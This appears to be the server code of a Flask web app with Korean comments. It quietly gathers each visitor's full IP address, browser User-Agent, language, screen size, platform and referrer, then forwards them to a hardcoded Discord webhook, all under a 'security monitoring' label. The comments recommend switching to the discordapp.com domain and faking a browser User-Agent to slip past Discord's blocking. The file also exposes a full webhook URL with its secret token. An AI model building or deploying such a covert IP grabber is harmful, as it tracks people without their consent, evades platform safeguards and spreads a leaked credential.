import requests
import datetime
import os
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# [팁] discord.com 대신 discordapp.com을 사용하면 차단을 우회할 확률이 높습니다.
# 동일한 웹훅 주소이지만 도메인만 살짝 바꿔서 전송합니다.
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1477910235048968275/otX6RnzhUAWP3WJRe8A_wMAQ9hWyLPSoY3kIAhYC__CIr87A1bXqoRLyWpeHnTsRPA_v"

def get_masked_ip(ip):
    """IP 뒷자리를 가려주는 함수"""
    try:
        parts = ip.split('.')
        if len(parts) == 4:
            return f"{parts[0]}.{parts[1]}.xxx.xxx"
        return ip
    except:
        return "Unknown"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/webhook', methods=['POST'])
def send_to_discord():
    try:
        client_data = request.json or {}
        
        # Render/Proxy 환경에서 실제 사용자 IP 추출
        x_forwarded = request.headers.get('X-Forwarded-For')
        if x_forwarded:
            raw_ip = x_forwarded.split(',')[0].strip()
        else:
            raw_ip = request.remote_addr

        masked_ip = get_masked_ip(raw_ip)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # 디스코드 차단을 피하기 위한 브라우저 위장용 헤더
        discord_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }

        def create_payload(ip_val, title_prefix, color, is_admin=False):
            title_icon = "🛡️" if is_admin else "🌐"
            return {
                "username": f"{title_prefix} 관제 센터",
                "avatar_url": "https://i.imgur.com/4M34hi2.png",
                "embeds": [{
                    "title": f"{title_icon} {title_prefix}: 새로운 접속 감지",
                    "description": "사용자의 상세 접속 환경을 성공적으로 분석했습니다.",
                    "color": color,
                    "fields": [
                        {"name": "📍 접속 IP 주소", "value": f"`{ip_val}`", "inline": False},
                        {"name": "🌍 언어 및 지역", "value": f"`{client_data.get('language', 'N/A')}`", "inline": False},
                        {"name": "🖥️ 화면 해상도", "value": f"`{client_data.get('screen', 'N/A')}`", "inline": False},
                        {"name": "⚙️ 플랫폼/기기", "value": f"`{client_data.get('platform', 'N/A')}`", "inline": False},
                        {"name": "🔗 유입 경로", "value": f"`{request.referrer or '직접 접속'}`", "inline": False},
                        {"name": "🕵️ 브라우저 정보 (User-Agent)", "value": f"```{user_agent}```", "inline": False}
                    ],
                    "footer": {
                        "text": f"기록 시각: {timestamp} | 보안 모니터링 시스템",
                        "icon_url": "https://i.imgur.com/fKL3Sjy.png"
                    }
                }]
            }

        # 1. 마스킹 버전 전송 (초록색)
        masked_payload = create_payload(masked_ip, "일반 모니터링", 5763719)
        res1 = requests.post(WEBHOOK_URL, json=masked_payload, headers=discord_headers)
        print(f"Masked Send Status: {res1.status_code}")

        # 429 에러 방지를 위한 1.5초 대기
        time.sleep(1.5)

        # 2. 관리자 버전 전송 (빨간색, 원본 IP)
        raw_payload = create_payload(raw_ip, "관리자 보안 로그", 15548997, is_admin=True)
        res2 = requests.post(WEBHOOK_URL, json=raw_payload, headers=discord_headers)
        print(f"Raw Send Status: {res2.status_code}")

    except Exception as e:
        print(f"Error: {e}")

    return jsonify({"status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
